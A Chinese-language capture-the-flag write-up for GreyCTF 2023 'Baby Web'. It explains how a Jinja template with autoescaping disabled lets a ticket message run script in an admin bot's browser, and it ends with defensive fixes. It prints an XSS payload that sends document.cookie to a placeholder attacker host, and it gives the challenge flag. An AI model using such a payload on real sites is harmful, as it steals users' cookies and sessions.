# GreyCTF 2023 Baby Web

## 题目简述

用户提交工单内容后，服务端让管理员机器人访问 `/ticket?message=...`。模板显式关闭 Jinja 自动转义，而机器人预先写入名为 `flag` 的非 HttpOnly Cookie，因此工单内容可以触发 XSS 并读取 flag。

## 解题过程

服务端虽然对消息做了 URL 编码，但取出查询参数后，模板使用：

```jinja2
{% autoescape false %} {{ message }} {% endautoescape %}
```

URL 编码只保护传输，不会在 HTML 渲染时消除标签语义。提交一个无需用户交互的载荷即可：

```html
<img src=x onerror="new Image().src='//ATTACKER/?c='+encodeURIComponent(document.cookie)">
```

管理员机器人先打开站点，再添加：

```python
{"name": "flag", "value": COOKIE["flag"]}
```

随后访问工单链接，`onerror` 读取 `document.cookie` 并把内容发送到自有接收端。从回连参数中取出 flag：

```text
grey{b4by_x55_347cbd01cbc74d13054b20f55ea6a42c}
```

## 方法总结

本题是典型的管理员机器人 XSS：用户输入进入无转义模板，敏感 Cookie 又允许 JavaScript 读取。URL 编码不能替代输出编码。防护应同时恢复模板自动转义、按上下文净化允许的 HTML，并给敏感 Cookie 设置 `HttpOnly`、`Secure` 和合适的 `SameSite` 属性。
